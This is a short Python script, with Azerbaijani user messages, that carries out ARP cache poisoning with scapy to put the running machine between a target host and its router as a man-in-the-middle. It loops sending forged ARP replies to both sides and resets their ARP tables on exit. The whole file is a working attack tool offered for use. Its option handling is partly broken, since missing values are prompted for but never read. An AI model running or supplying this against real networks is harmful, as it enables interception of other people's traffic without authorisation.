import scapy.all as scapy
import optparse
import subprocess

import time
def get_mac(ipadress):
    arp_request=scapy.ARP(pdst=ipadress)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined=broadcast/arp_request
    answer=scapy.srp(combined,timeout=1,verbose=False)[0]
    return (answer[0][1].hwsrc)
def arp_poison(target_ip,modem_ip):
    targetmac=get_mac(target_ip)
    result=scapy.ARP(op=2,pdst=target_ip,psrc=modem_ip,hwdst=targetmac)
    scapy.send(result,verbose=False)
def reset_poison(mixed_ip,router_ip):
    mixedmac=get_mac(mixed_ip)
    router_mac=get_mac(router_ip)
    result=scapy.ARP(op=2,pdst=mixed_ip,psrc=router_ip,hwdst=mixedmac,hwsrc=router_mac)
    scapy.send(result,verbose=False,count=5)

def input():
    option=optparse.OptionParser()
    option.add_option("-i",dest="targetip",help="TargetIP")
    option.add_option("-r",dest="routerip",help="RouterIP")
    option.add_option("-t",dest="timeout",help="TimeOut")
    options=option.parse_args()[0]
    if not options.targetip:
        print("Qarsi Terefin Ipsini gir : ")
    if not options.routerip:
        print("Modemin Ipsini gir : ")
    if not options.timeout:
        print("Paket Atmaq Ucun Saniye : ")
    return options
user_input=input()
targetip=(user_input.targetip)
routerip=(user_input.routerip)
timeout=(user_input.timeout)
num=0
subprocess.call("clear")
print("Mitm Proqramima Xos Gelmisiniz!\n\n")
try:
    while True:
        arp_poison(targetip,routerip)
        arp_poison(routerip,targetip)
        num+=2
        print("\rPaket Gonderildi : "+str(num),end="")
        time.sleep(float(timeout))
except KeyboardInterrupt:
    print("\nProqramdan Cixis Edildi ve Reset Atildi")
    reset_poison(targetip,routerip)
    reset_poison(routerip,targetip)


